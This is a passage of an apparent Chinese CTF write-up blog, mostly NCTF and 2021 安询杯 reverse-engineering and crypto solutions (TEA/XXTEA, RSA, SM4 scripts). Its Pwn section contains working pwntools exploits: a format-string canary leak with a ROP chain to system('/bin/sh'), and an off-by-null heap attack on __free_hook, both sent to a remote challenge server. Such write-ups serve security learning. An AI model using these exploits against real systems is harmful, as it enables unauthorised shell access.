for ( j = 0; j &lt; 24; ++j ) { v8 -= 2; sub_8211F0(v8); } } 反调试，off_825014在主函数出现过，但是个假逻辑，所以这部分内容是SMC修改技术。 unsigned int __cdecl sub_8211F0(unsigned int *a1){ unsigned int result; // eax int i; // [esp+0h] [ebp-Ch] unsigned int v3; // [esp+4h] [ebp-8h] unsigned int v4; // [esp+8h] [ebp-4h] v4 = *a1; v3 = a1[1]; for ( i = 0; i &lt; 64; ++i ) { v3 -= (dword_825004[(*(_DWORD *)delta &gt;&gt; 11) &amp; 3] + *(_DWORD *)delta) ^ (v4 + ((v4 &gt;&gt; 5) ^ (16 * v4))); *(_DWORD *)delta += dword_825000; v4 -= (dword_825004[delta[0] &amp; 3] + *(_DWORD *)delta) ^ (v3 + ((v3 &gt;&gt; 5) ^ (16 * v3))); } *a1 = v4; result = v3; a1[1] = v3; return result;} 直接改eip绕过这个反调试即可，同时修改代码用的xTea，不过delta的值有个小坑，main函数中有个创建线程的函数，将delta赋值为0xDA76C600，patch进行修改，后面下个断F9。修复函数后拿到真正处理逻辑。 int __cdecl sub_823000(const char *a1){ signed int v2; // [esp+0h] [ebp-98h] unsigned int v3; // [esp+10h] [ebp-88h] signed int v4; // [esp+1Ch] [ebp-7Ch] int v5; // [esp+2Ch] [ebp-6Ch] int v6; // [esp+2Ch] [ebp-6Ch] char v7; // [esp+32h] [ebp-66h] signed int Size; // [esp+34h] [ebp-64h] unsigned int v9; // [esp+38h] [ebp-60h] int k; // [esp+38h] [ebp-60h] unsigned __int8 *v11; // [esp+3Ch] [ebp-5Ch] int i; // [esp+40h] [ebp-58h] signed int j; // [esp+40h] [ebp-58h] signed int m; // [esp+40h] [ebp-58h] signed int n; // [esp+40h] [ebp-58h] signed int ii; // [esp+40h] [ebp-58h] char v17[62]; // [esp+44h] [ebp-54h] int v18; // [esp+82h] [ebp-16h] int v19; // [esp+86h] [ebp-12h] int v20; // [esp+8Ah] [ebp-Eh] int v21; // [esp+8Eh] [ebp-Ah] __int16 v22; // [esp+92h] [ebp-6h] v3 = strlen(a1); Size = 146 * v3 / 0x64 + 1; v4 = 0; v11 = (unsigned __int8 *)malloc(Size); v17[0] = 82; v17[1] = -61; v17[2] = 26; v17[3] = -32; v17[4] = 22; v17[5] = 93; v17[6] = 94; v17[7] = -30; v17[8] = 103; v17[9] = 31; v17[10] = 31; v17[11] = 6; v17[12] = 6; v17[13] = 31; v17[14] = 23; v17[15] = 6; v17[16] = 15; v17[17] = -7; v17[18] = 6; v17[19] = 103; v17[20] = 88; v17[21] = -78; v17[22] = -30; v17[23] = -116; v17[24] = 15; v17[25] = 42; v17[26] = 6; v17[27] = -119; v17[28] = -49; v17[29] = 42; v17[30] = 6; v17[31] = 31; v17[32] = -104; v17[33] = 26; v17[34] = 62; v17[35] = 23; v17[36] = 103; v17[37] = 31; v17[38] = -9; v17[39] = 58; v17[40] = 68; v17[41] = -61; v17[42] = 22; v17[43] = 51; v17[44] = 105; v17[45] = 26; v17[46] = 117; v17[47] = 22; v17[48] = 62; v17[49] = 23; v17[50] = -43; v17[51] = 105; v17[52] = 122; v17[53] = 27; v17[54] = 68; v17[55] = 68; v17[56] = 62; v17[57] = 103; v17[58] = -9; v17[59] = -119; v17[60] = 103; v17[61] = -61; v18 = 0; v19 = 0; v20 = 0; v21 = 0; v22 = 0; memset(v11, 0, Size); v9 = 0; for ( i = 0; i &lt; 256; ++i ) { v7 = byte_825018[i]; byte_825018[i] = byte_825018[(i + *((unsigned __int8 *)&amp;delta + i % 4)) % 256];// delta变为0了 byte_825018[(i + *((unsigned __int8 *)&amp;delta + i % 4)) % 256] = v7; } while ( v9 &lt; strlen(a1) ) { v5 = a1[v9]; for ( j = 146 * v3 / 0x64; ; --j ) { v6 = v5 + (v11[j] &lt;&lt; 8); v11[j] = v6 % 47; v5 = v6 / 47; if ( j &lt; v4 ) v4 = j; if ( !v5 &amp;&amp; j &lt;= v4 ) break; } ++v9; } for ( k = 0; !v11[k]; ++k ) ; for ( m = 0; m &lt; Size; ++m ) v11[m] = byte_825118[v11[k++]]; // 单表替换 while ( m &lt; Size ) v11[m++] = 0; v2 = strlen((const char *)v11); for ( n = 0; n &lt; v2; ++n ) v11[n] ^= byte_825018[v11[n]]; // 异或处理 for ( ii = 0; ii &lt; v2; ++ii ) { if ( v11[ii] != (unsigned __int8)v17[ii] ) { printf(&quot;Wrong!\\n&quot;, v2); exit(0); } } printf(&quot;Right!\\n&quot;, v2); return 0;} delta的值是0，需要注意一下，接着就是写脚本逆向，z3不好直接求解，加密流程是先将输入转为47进制下每位的值存在数组v11中，找到第一个非0值的下标k，接着进行单表替换和异或。因为涉及到表索引和本身异或不好逆向还原，所以想着在爆破v11数组。 enc=[0x52, 0xC3, 0x1A, 0xE0, 0x16, 0x5D, 0x5E, 0xE2, 0x67, 0x1F, 0x1F, 0x06, 0x06, 0x1F, 0x17, 0x06, 0x0F, 0xF9, 0x06, 0x67, 0x58, 0xB2, 0xE2, 0x8C, 0x0F, 0x2A, 0x06, 0x89, 0xCF, 0x2A, 0x06, 0x1F, 0x98, 0x1A, 0x3E, 0x17, 0x67, 0x1F, 0xF7, 0x3A, 0x44, 0xC3, 0x16, 0x33, 0x69, 0x1A, 0x75, 0x16, 0x3E, 0x17, 0xD5, 0x69, 0x7A, 0x1B, 0x44, 0x44, 0x3E, 0x67, 0xF7, 0x89, 0x67, 0xC3]c=[]for i in range(61): temp=[] for j in range(47): tmp=tb2[j] tmp=tmp^table[tmp] if tmp==enc[i]: temp.append(j) if len(temp)==1: c.append(temp[0]) else: c.append(temp)c.insert(0,0)#[0, 2, 0, [33, 45], 44, 30, 40, 8, 23, [7, 11, 22], [34, 37], [34, 37], [19, 20, 43], [19, 20, 43], [34, 37], 24, [19, 20, 43], [4, 31], 29, [19, 20, 43], [7, 11, 22], 13, 5, 23, 41, [4, 31], 35, [19, 20, 43], 9, 14, 35, [19, 20, 43], [34, 37], 3, [33, 45], 10, 24, [7, 11, 22], [34, 37], 38, 1, 25, 0, 30, 6, 42, [33, 45], 36, 30, 10, 24, 21, 42, 26, 28, 25, 25, 10, [7, 11, 22], 38, 9, [7, 11, 22]] v11第一位是0，根据加密的最后一位是0xc3，或者多次测试都可知，不过这解有点多，下面就是对c进行排列组合，之后47进制转，long_to_bytes下即可，不过这…..tmd，dfs不太会写，直接硬爆破了，大概跑了半小时,直接整emo了。完整如下 from Crypto.Util.number import *def dododo(c): sum = 0 for i in range(62): sum += c[i] * pow(47, 61 - i) m=long_to_bytes(sum) try: flag=m.decode() print(flag) exit(0) except: passenc=[0x52, 0xC3, 0x1A, 0xE0, 0x16, 0x5D, 0x5E, 0xE2, 0x67, 0x1F, 0x1F, 0x06, 0x06, 0x1F, 0x17, 0x06, 0x0F, 0xF9, 0x06, 0x67, 0x58, 0xB2, 0xE2, 0x8C, 0x0F, 0x2A, 0x06, 0x89, 0xCF, 0x2A, 0x06, 0x1F, 0x98, 0x1A, 0x3E, 0x17, 0x67, 0x1F, 0xF7, 0x3A, 0x44, 0xC3, 0x16, 0x33, 0x69, 0x1A, 0x75, 0x16, 0x3E, 0x17, 0xD5, 0x69, 0x7A, 0x1B, 0x44, 0x44, 0x3E, 0x67, 0xF7, 0x89, 0x67, 0xC3]table=[0x21, 0x43, 0x65, 0x87, 0x09, 0x21, 0x43, 0x65, 0xA2, 0x9B, 0xF4, 0xDF, 0xAC, 0x7C, 0xA1, 0xC6, 0x16, 0xD0, 0x0F, 0xDD, 0xDC, 0x73, 0xC5, 0x6B, 0xD1, 0x96, 0x47, 0xC2, 0x26, 0x67, 0x4E, 0x41, 0x82, 0x20, 0x56, 0x9A, 0x6E, 0x33, 0x92, 0x88, 0x29, 0xB5, 0xB4, 0x71, 0xA9, 0xCE, 0xC3, 0x34, 0x50, 0x59, 0xBF, 0x2D, 0x57, 0x22, 0xA6, 0x30, 0x04, 0xB2, 0xCD, 0x36, 0xD5, 0x68, 0x4D, 0x5B, 0x45, 0x9E, 0x85, 0xCF, 0x9D, 0xCC, 0x61, 0x78, 0x32, 0x76, 0x31, 0xE3, 0x80, 0xAD, 0x39, 0x4F, 0xFA, 0x72, 0x83, 0x4C, 0x86, 0x60, 0xB7, 0xD7, 0x63, 0x0C, 0x44, 0x35, 0xB3, 0x7B, 0x19, 0xD4, 0x69, 0x08, 0x0B, 0x1F, 0x3D, 0x11, 0x79, 0xD3, 0xEE, 0x93, 0x42, 0xDE, 0x23, 0x3B, 0x5D, 0x8D, 0xA5, 0x77, 0x5F, 0x58, 0xDB, 0x97, 0xF6, 0x7A, 0x18, 0x52, 0x15, 0x74, 0x25, 0x62, 0x2C, 0x05, 0xE8, 0x0D, 0x98, 0x2A, 0x43, 0xE2, 0xEF, 0x48, 0x87, 0x49, 0x1C, 0xCA, 0x2B, 0xA7, 0x8A, 0x09, 0x81, 0xE7, 0x53, 0xAA, 0xFF, 0x6F, 0x8E, 0x91, 0xF1, 0xF0, 0xA4, 0x46, 0x3A, 0x7D, 0x54, 0xEB, 0x2F, 0xC1, 0xC0, 0x0E, 0xBD, 0xE1, 0x6C, 0x64, 0xBE, 0xE4, 0x02, 0x3C, 0x5A, 0xA8, 0x9F, 0x37, 0xAF, 0xA0, 0x13, 0xED, 0x1B, 0xEC, 0x8B, 0x3E, 0x7E, 0x27, 0x99, 0x75, 0xAB, 0xFE, 0xD9, 0x3F, 0xF3, 0xEA, 0x70, 0xF7, 0x95, 0xBA, 0x1D, 0x40, 0xB0, 0xF9, 0xE5, 0xF8, 0x06, 0xBC, 0xB6, 0x03, 0xC9, 0x10, 0x9C, 0x2E, 0x89, 0x5C, 0x7F, 0xB1, 0x1A, 0xD6, 0x90, 0xAE, 0xDA, 0xE6, 0x5E, 0xB9, 0x84, 0xE9, 0x55, 0xBB, 0xC7, 0x0A, 0xE0, 0x66, 0xF2, 0xD8, 0xCB, 0x00, 0x12, 0xB8, 0x17, 0x94, 0x6A, 0x4A, 0x01, 0x24, 0x14, 0x51, 0x07, 0x65, 0x21, 0xC8, 0x38, 0xFD, 0x8F, 0xC4, 0xF5, 0xFC]#delta=[0,0xc6,0x76,0xda]tb2=[0xA7, 0x1C, 0x7E, 0xAF, 0xD9, 0xC2, 0xC0, 0xBE, 0x1F, 0x45, 0x9A, 0x85, 0x26, 0xE3, 0x87, 0xC3, 0x21, 0xE0, 0x95, 0x10, 0x71, 0x70, 0x02, 0x75, 0x35, 0xA5, 0x1D, 0x0D, 0x2F, 0xEE, 0x25, 0x7B, 0xB5, 0x82, 0x66, 0x8D, 0xDB, 0x53, 0x3A, 0x29, 0xD4, 0x43, 0x99, 0x97, 0x9D, 0xE8, 0x49, 0x00]c=[]for i in range(61): temp=[] for j in range(47): tmp=tb2[j] tmp=tmp^table[tmp] if tmp==enc[i]: temp.append(j) if len(temp)==1: c.append(temp[0]) else: c.append(temp)c.insert(0,0)print(c)for i in c: if isinstance(i,int): pass else: print(i)c[3]=45tblen=[]l=1index=[]for i in range(len(c)): try: tblen.append(len(c[i])) l*=len(c[i]) index.append(i) except: tblen.append(1)print(tblen)print(index)sum=0t1=[7, 11, 22]t2=[34, 37]t3=[19, 20, 43]t4=[4, 31]t5=[33, 45]for a1 in range(3): c[9]=t1[a1] for a2 in range(2): c[10]=t2[a2] for a3 in range(2): c[11]=t2[a3] for a4 in range(3): c[12]=t3[a4] for a5 in range(3): c[13]=t3[a5] for a6 in range(2): c[14]=t2[a6] for a7 in range(3): c[16]=t3[a7] for a8 in range(2): c[17]=t4[a8] for a9 in range(3): c[19]=t3[a9] for a10 in range(3): c[20]=t1[a10] for a11 in range(2): c[25]=t4[a11] for a12 in range(3): c[27]=t3[a12] for a13 in range(3): c[31]=t3[a13] for a14 in range(2): c[32]=t2[a14] for a15 in range(2): c[34]=t5[a15] for a16 in range(3): c[37]=t1[a16] for a17 in range(2): c[38]=t2[a17] for a18 in range(2): c[46]=t5[a18] for a19 in range(3): c[58]=t1[a19] for a20 in range(3): c[61]=t1[a20] dododo(c)#NCTF{ADF0E239-D911-3781-7E40-A575A19E5835} *easy_mobile为了保7-10名拿衣服纪念品所以控分没交so被ollvm了，1400行。 但是我用deflat去混淆，最后只剩三分一的代码？，没法只能用原来的看。 我尝试去动调，发现下不了断点？ 想到只有1400行而已。 然后我比较菜，花了一个多小时才整理了逻辑。 首先，我在719行找到了获取输入 然后发现判断长度为24 交叉索引我们的输入 发现，程序会将前16个字节分成4个字节一组分成四组的进行操作，最后8个字节分成两组。 我先看了程序对后面八个字节进行了什么操作 他作为输入传进了下面这个函数。并且上面还将一个长为16字节的字符串传了进去 跟进去看了一下 我顿时反应过来了，这和tea怎么那么像？ 然后我手动恢复了一下 这不就是改了delta但还是原汁原味的tea吗？而且他a2就是我们传入的第二个字符串，那就是KEY 我直接用我祖传脚本梭哈得到了我们后8个字符。 #include &lt;stdio.h&gt; #include &lt;stdint.h&gt; //加密函数 void encrypt(uint32_t* v, uint32_t* k) { uint32_t v0 = v[0], v1 = v[1], sum = 0, i; /* set up */ uint32_t delta = 0x9e3779b9; /* a key schedule constant */ uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3]; /* cache key */ for (i = 0; i &lt; 32; i++) { /* basic cycle start */ sum += delta; v0 += ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k1); v1 += ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k3); } /* end cycle */ v[0] = v0; v[1] = v1;}//解密函数 void decrypt(unsigned int* v, unsigned int* k) { unsigned int v0 = v[0], v1 = v[1], i; int sum = 0x12345678 &lt;&lt; 5;/* set up */ uint32_t delta = 0x12345678; // 0x9e3779b8 /* a key schedule constant */ uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3]; /* cache key */ for (i = 0; i &lt; 32; i++) { /* basic cycle start */ v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k3); v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k1); sum -= delta; } /* end cycle */ v[0] = v0; v[1] = v1;}int main(){ unsigned int v[2] = { 0xC65AEDA,0xADBF8DB1 }, k[4] = { 1634232689, 1852399976, 1851879017, 1835101793 }; // v为要加密的数据是两个32位无符号整数 // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位 //printf(&quot;%x %xx\\n&quot;, v[0], v[1]); decrypt(v, k); printf(&quot;%x %x\\n&quot;, v[0], v[1]); puts((char*)v);//58af2715c return 0;} 然后去继续交叉索引到第一次被调用的地方然后理解一下 就是将我们的前4个字符，保存在一个int32x4的数据类型中，可以理解为他是一个大小为四的int32类型数组。下面一样的操作，当取完前16个字节后，他会取一些常量，如下 然后整理一下就是这也 v48 = *v299; // [0x20,0x22,0x23,0x24]v447 = *v295; // [flag0,flag1,flag2,flag3]v446 = v48;v445 = vmulq_s32(v447, v48);*v295 = v445;v49 = *v300; // [0x37,0x38,0x39,0x3a]v450 = *v295;v449 = v49;v448 = vsubq_s32(v450, vnegq_s32(v49));*v295 = v448; // enc0v50 = *v299; // [0x20,0x22,0x23,0x24]v468 = *v296; // [flag4,flag5,flag6,flag7]v467 = v50;v466 = vmulq_s32(v468, v50);*v296 = v466;v51 = *v300; // [0x37,0x38,0x39,0x3a]v465 = *v296;v464 = v51;v463 = vsubq_s32(v465, vnegq_s32(v51));*v296 = v463; // enc1v52 = *v301; // [0x30,0x31,0x32,0x33]v462 = *v297; // [flag8,flag9,flag10,flag11]v461 = v52;v460 = vmulq_s32(v462, v52);*v297 = v460;v53 = *v302; // [0x50,0x52,0x53,0x54]v459 = *v297;v458 = v53;v457 = vsubq_s32(v459, vnegq_s32(v53));*v297 = v457; // enc2v54 = *v299; // [0x20,0x22,0x23,0x24]v456 = *v298; // [flag12,flag13,flag14,flag15]v455 = v54;v454 = vmulq_s32(v456, v54);*v298 = v454;v55 = *v300; // [0x37,0x38,0x39,0x3a]v453 = *v298;v452 = v55;v451 = vnegq_s32(vsubq_s32(vnegq_s32(v55), v453));// v451=-((-v300)-v453) v453=v451-v300*v298 = v451; // enc3 一开始尝试爆破，然后我发现我傻了，直接求逆不就行了？然后一把梭 enc=[ 0x00000CD7, 0x00000698, 0x00000D7C, 0x000006FA, 0x00000CB7, 0x000007CA, 0x0000079B, 0x000007D2, 0x00000950, 0x00000AD9, 0x00000ADF, 0x000014A6, 0x00000CF7, 0x00000720, 0x00000732,0x000007F6]v299=[0x20,0x22,0x23,0x24]v300=[0x37,0x38,0x39,0x3a]v301=[0x30,0x31,0x32,0x33]v302=[0x50,0x52,0x53,0x54]def mul(a,b): c=[] for i in range(4): c.append(a[i] * b[i]) return c#set0c=[]e=enc[0:4]for i in range(4): c.append(e[i]-v300[i])for i in range(4): print(chr(c[i]//v299[i]),end='')#set1c=[]e=enc[4:8]for i in range(4): c.append(e[i]-v300[i])for i in range(4): print(chr(c[i]//v299[i]),end='')#set2c=[]e=enc[8:12]for i in range(4): c.append(e[i]-v302[i])for i in range(4): print(chr(c[i]//v301[i]),end='')#set3c=[]e=enc[12:16]for i in range(4): c.append(e[i]-v300[i])for i in range(4): print(chr(c[i]//v299[i]),end='')#e0a0d966076ff437 e0a0d966076ff43758af2715 Cryptosignin对h/k连分数展开可以求到p def transform(x,y): res=[] while y: res.append(x//y) x,y=y,x%y return res def continued_fraction(sub_res): numerator,denominator=1,0 for i in sub_res[::-1]: denominator,numerator=numerator,i*numerator+denominator return denominator,numerator def sub_fraction(x,y): res=transform(x,y) res=list(map(continued_fraction,(res[0:i] for i in range(1,len(res))))) return resk=94541588860584895585135152950569493777168309607384495730944110393788712443252059813470464503558980161423182930915955597122997950103392684040352673659694990925903156093591505153081718027169554019948988048641061593654540898258994671824807628660558123733006209479395447337793897155523508261277918178756662618785n=780382574657056148524126341547161694121139907409040429176771134165303790043856598163799273195157260505524054034596118923390755532760928964966379457317135940979046201401066257918457068510403020146410174895470232276387032511651496790519359024937958635283547294676457588680828221680705802054780628993173199987362419589945445821005688218540209709368995166794607635504501281131700210990592718388166388793182269128127850804650083811982799377308916540691843310867205397c=601133470721804838247833449664753362221136965650852411177773274117379671405966812018926891137093789704412080113310175506684194683631033003847585245560967863306852502110832136044837625931830243428075035781445021691969145959052459661597331192880689893369292311652372449853270889898705765869674961705116875378568712306021536838123003111819172078652012105725060809972222290408551883774305223612755026614701916201374200602892717051698568751566665976546137674450533774h=2**1024for p,q in sub_fraction(h,k): if n%p==0: print(p) if n%q==0: print(q)p=9591034708161364221769733163551836281062083244512519384396165987809544507968391606587728397659016542948096617311787604058178460710869231247971978002127911phi=p-1from gmpy2 import *from Crypto.Util.number import *print(long_to_bytes(pow(c,invert(65537,phi),p)))#nctf{238fa78a-5e61-4dc6-8faf-7e2e30e02286}","link":"/posts/15611/"},{"title":"2021安询杯wp","text":"2021安询杯wp Misc应该算是签到来得早不如来的巧 CyzCC_loves_LOL小脑洞+老考点，理解一下 其实是放进百度翻译然后一下看出来了 s = 'D0g3isthepAssword'flag = ''for i in range(len(s)): tmp = ord(s[i])-3 if(tmp&lt;65): flag += chr(tmp+26) else: flag += chr(tmp)print(flag) 密码为AGdJfpqebmXpptloa 然后解压得到图片和图片（ jpg那个图说是silent，于是知道是silenteye，右边的图不是piet就是brainloller，试了之后发现是brainloller 然后.\\bftools.exe decode brainloller .\\Program.png，得到的brainfuck解码一下得到0MTTW CWZVN!，空格替换下划线即可 然后silenteye解jpg，密码为0MTTW_CWZVN! D0g3{544f3225-bbaf-47dc-ba8d-5bda54cbaecb} Cthulhu Mythoshint.mp3是sstv，后面那段扫一下即可 解码 根据提示猜测是泰拉瑞亚，去github下载一个地图编辑器 进去就看到7I4YF6QL0 然后猜测剩下的在对话里之类的，之后在分析里找到内容 导出后看txt 按顺序撸下来,得到 emm能看出来前面和后面都有错误，但是前面能知道是D0g3{M1necR4ft_G0_A 后面是d_Try_Terr4ria!} 然后觉得中间填and，尝试提交发现正确，所以flag为 D0g3{M1necR4ft_G0_And_Try_Terr4ria!} lovemath爆CRC 得到密码 th1s_Is_Y0ur_pa33w0rd_We1c0m3e blind是LSB，BGR的，提取出来一个图片纯数字 然后用QQ OCR一下 1251077695482776025338577125579215707216262981842821000162276994967943212822693842845266851984880336702446444408289977864567921038435144120176357529686342977212633764247620567669441602729004003473312468776582473461071462631554533766709934484393185739708817165738912742570170547790145328253304755428563911689057632001795598667127514331122190795355921436735375126688142856470280128821316586008242687241930886868804388482643589009068543771977163419519208340324352 结合题目给的甚至能画出自己 找到了塔珀自指公式，然后github发现有解码的网站 http://keelyhill.github.io/tuppers-formula/ 反过来看即可 D0g3{I_LOV3_math} Pwnstack格式化字符串泄露基地址和canary，计算出pop,system,/bin/sh在程序中的地址然后栈溢出即可 from pwn import *context.log_level='debug'p = remote('47.108.195.119',20113)p.recv()p.recv()p.send('n03tAck')p.recv()p.sendline('Mumuzi')p.recv()payload='%11$p%9$p'p.send(payload)canary=int(p.recv(18),16)success(&quot;canary:&quot;+hex(canary))start_addr=int(p.recv(14),16)success(&quot;start_addr:&quot; + hex(start_addr))addrbase=start_addr-0x0870sys_addr=0x000A8c+addrbasebinsh_addr=0x00B24+addrbasepop_rdi=0x0000000000000b03+addrbasesuccess(&quot;sys_addr:&quot; + hex(sys_addr))success(&quot;binsh_addr:&quot; + hex(binsh_addr))success(&quot;pop_rdi:&quot; + hex(pop_rdi))payload='a'*(0x18)+p64(canary)+p64(0)+p64(pop_rdi)+p64(binsh_addr)+p64(sys_addr)p.send(payload)p.interactive() 连上之后cat sky_token然后exit输入sky_token即可 本来一开始是windows跑的每次exit输入sky_token都显示我错误，只好去打开ubuntu老老实实跑一下了 noleak1.思路：off by null打__free_hook from pwn import *#p=process('./noleak1')p=remote('47.108.195.119',20182)context.log_level='debug'elf=ELF('./noleak1')libc=ELF('libc.so.6')#gdb.attach(p,'b *$rebase(0xfc9)')p.sendline('n03tAck')p.sendline('1u1u')p.sendlineafter('please input a str:','\\x4e\\x30\\x5f\\x70\\x79\\x5f\\x31\\x6e\\x5f\\x74\\x48\\x65\\x5f\\x63\\x74\\x37')def menu(id): p.sendlineafter('&gt;',str(id))def add(id,size): menu(1) p.sendlineafter('Index?\\n',str(id)) p.sendlineafter('Size?\\n',str(size))def show(id): menu(2) p.sendlineafter('Index?\\n',str(id))def edit(id,content): menu(3) p.sendlineafter('Index?\\n',str(id)) p.sendlineafter('content:\\n',str(content))def delete(id): menu(4) p.sendlineafter('Index?\\n',str(id))add(0,0x450)add(1,0x18)add(2,0x4f0)add(3,0x18)delete(0)edit(1,'a'*0x10+p64(0x480))delete(2)add(0,0x450)show(1)leak=u64(p.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,&quot;\\x00&quot;))malloc_hook=leak+0x7f3223b9bc30-0x7f3223b9bca0success('malloc_hook:'+hex(malloc_hook))libc_base=malloc_hook-libc.sym['__malloc_hook']success('libc_base:'+hex(libc_base))add(2,0x18)delete(2)edit(1,p64(libc_base+libc.sym['__free_hook']))add(4,0x10)add(5,0x10)edit(5,p64(libc_base+libc.sym['system']))add(6,0x30)edit(6,'/bin/sh\\x00')delete(6)#gdb.attach(p)p.interactive() Resign_in一个贪吃蛇游戏（又是一个嵌屎的题） smc 直接动调，然后手动改跳转进入该函数。 是shuffle+xxtea 先解xxtea 因为我是改条件跳转的，所以要爆破delta。 #include &lt;stdio.h&gt; #include &lt;stdint.h&gt; //#define DELTA (0x44336730+ 0x13) #define MX (((z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[((p&amp;3)^e)] ^ z))) void btea(uint32_t* v, int n, uint32_t const key[4],int DELTA){ uint32_t y, z, sum; unsigned p, rounds, e; if (n &gt; 1) /* Coding Part */ { rounds = 6 + 52 / n; sum = 0; z = v[n - 1]; do { sum += DELTA; e = (sum &gt;&gt; 2) &amp; 3; for (p = 0; p &lt; n - 1; p++) { y = v[p + 1]; z = v[p] += MX; } y = v[0]; z = v[n - 1] += MX; } while (--rounds); } else if (n &lt; -1) /* Decoding Part */ { n = -n; rounds = 6 + 52 / n; sum = rounds * DELTA; y = v[0]; do { e = (sum &gt;&gt; 2) &amp; 3; for (p = n - 1; p &gt; 0; p--) { z = v[p - 1]; y = v[p] -= MX; } z = v[n - 1]; y = v[0] -= MX; sum -= DELTA; } while (--rounds); }}int main(){ uint32_t const k[4] = { 0x44,0x30, 0x67,0x33 }; int n = 32; //n的绝对值表示v的长度，取正表示加密，取负表示解密 // v为要加密的数据是两个32位无符号整数 // k为加密解密密钥，为4个32位无符号整数，即密钥长度为128位 /* printf(&quot;加密前原始数据：%u %u\\n&quot;, v[0], v[1]); btea(v, n, k); printf(&quot;加密后的数据：%u %u\\n&quot;, v[0], v[1]);*/ //puts((char*)v); int DELTA = 0x44336730; for (DELTA; DELTA &lt;= 0x44336730 + 256; DELTA += 1) { uint32_t v[32] = { 0xBF8ED8A5, 0xE115A9F9, 0xFCD3F08A, 0x8BBF8946, 0xC308B162, 0x2B19CF29, 0x7A770656, 0xA4BAE4BA, 0x4E3E8CE4, 0x01A7E1D9, 0x75E9CE04, 0x22B593B9, 0x497742B4, 0x24EB15F6, 0xF2C2FF0E, 0x47973039, 0xC801CA0D, 0x6A125861, 0x80320BE8, 0x0385BD47, 0x69F96DDD, 0xE56490D1, 0x2D3CAD4B, 0x2D4200BE, 0x89EF6979, 0x4A91885D, 0x019DEBC7, 0x3BF8FD96, 0x1BDD2557, 0xB8685FDD, 0x57226614, 0x9F585C28 }; printf(&quot;%d\\n&quot;, DELTA); btea(v, -n, k, DELTA); for (int i = 0; i &lt; 32; i++) { printf(&quot;0x%x,&quot;, v[i]); } printf(&quot;\\n&quot;); } //puts((char*)v); return 0;} 得到： 0x3c,0x40,0x2b,0x66,0x6f,0x4f,0x5c,0x1d,0x42,0x1a,0x2b,0x57,0x36,0x44,0x33,0x1c,0x1d,0x6b,0x5c,0x6,0xf,0x1c,0x5c,0x1a,0x2b,0x9,0x32,0x6e,0x15,0x5a,0x2c,0x25 然后shuffle可以先算出他的偏移值，然后直接还原就可 m=[0x3c,0x40,0x2b,0x66,0x6f,0x4f,0x5c,0x1d,0x42,0x1a,0x2b,0x57,0x36,0x44,0x33,0x1c,0x1d,0x6b,0x5c,0x6,0xf,0x1c,0x5c,0x1a,0x2b,0x9,0x32,0x6e,0x15,0x5a,0x2c,0x25]shuffle=[0, 6, 17, 27, 18, 7, 1, 8, 19, 28, 20, 9, 2, 10, 21, 29, 22, 11, 3, 12, 23, 30, 24, 13, 4, 14, 25, 31, 26, 15, 5, 16]for i in range(len(shuffle)): d.append(m[shuffle[i]])print(d)for i in range(31,-1,-1): d[i] ^= d[(i + 1) % 32]print(bytearray(d))#Th4_1mp0rtant_th2n9_is_t0_le@rn! virtus他释放了一个文件？（这是一个拉屎的题）但是我找不到，不知道是不是权限问题，然后我用Resource Hacker直接梭哈出一个资源文件， 发现好多0x41,我想如果是可执行文件，这些0x41应该是0才对，然后我又异或了开头，发现开头为pe头。那就直接全部异或0x41,保存成新文件继续分析。 首先会对flag动手脚，然后会对key做手脚，一开始想爆破，爆破了半天，（最后解出来发现首位是特殊字符，寄！） 首先找到key def key_de(en): enc=[] for i in range(len(en)): enc.append(ord(en[i])) v2=[0]*56 #step3 re for i in range(4): temp=enc[i] if temp % 2==1: temp-=1 temp=[int(i) for i in bin(temp)[2:].zfill(6)] for j in range(6): v2[7 * i + 28 + j]=temp[j] if enc[i]%2==1: j=5 v2[7 * i + 29 + j]=1 a1=[] #验证step3 for i in range(4): v7 = 0 for j in range(6): v7 = 2 * (v7 + v2[7 * i + 28 + j]) if (v2[7 * i + 29 + j] == 1 and j == 5): v7+=1 a1.append(v7) #step2 v4=0 v5=0 for i in range(4): for j in range(7): v3=v2[7 * i + 28 + j] v2[7 * v5 + v4]=v3 v5 = (v5 + 1) % 4 v4 = (v4 + 2) % 7 f='' for i in range(4): for j in range(6,-1,-1): v2[7 * i + 28 + j]=v2[7 * i + j] f+=chr(int(''.join(map(str,v2[7 * i + 28 + 0 : 7* i + 28 + 7])),2)) return fprint(key_de(key_de(key_de(key_de('Lroo')))))#_shy 然后再sub_4012F0中发现是sm4的sbox盒，ck，fk都没改 直接找脚本梭哈 class SM4Cipher: def __init__(self, key: bytes): if not len(key) == 16: raise ValueError(&quot;SM4 key must be length of 16. &quot;) self._key_r = self._generate_key(key) self.block_size = 16 def encrypt(self, plaintext: bytes): return self._do(plaintext, self._key_r) def decrypt(self, ciphertext: bytes): return self._do(ciphertext, self._key_r[::-1]) def _do(self, text: bytes, key_r: list): text_ = [0 for _ in range(4)] # 将 128bit 转化成 4x32bit for i in range(4): text_[i] = int.from_bytes(text[4 * i:4 * i + 4], 'big') for i in range(32): box_in = text_[1] ^ text_[2] ^ text_[3] ^ key_r[i] box_out = self._s_box(box_in) temp = text_[0] ^ box_out ^ self._rot_left(box_out, 2) ^ self._rot_left(box_out, 10) temp = temp ^ self._rot_left(box_out, 18) ^ self._rot_left(box_out, 24) text_ = text_[1:] + [temp] text_ = text_[::-1] # 结果逆序 # 将 4x32bit 合并成 128bit result = bytearray() for i in range(4): result.extend(text_[i].to_bytes(4, 'big')) return bytes(result) def _generate_key(self, key: bytes): &quot;&quot;&quot;密钥生成&quot;&quot;&quot; key_r, key_temp = [0 for _ in range(32)], [0 for _ in range(4)] FK = [0xa3b1bac6, 0x56aa3350, 0x677d9197, 0xb27022dc] CK = [0x00070e15, 0x1c232a31, 0x383f464d, 0x545b6269, 0x70777e85, 0x8c939aa1, 0xa8afb6bd, 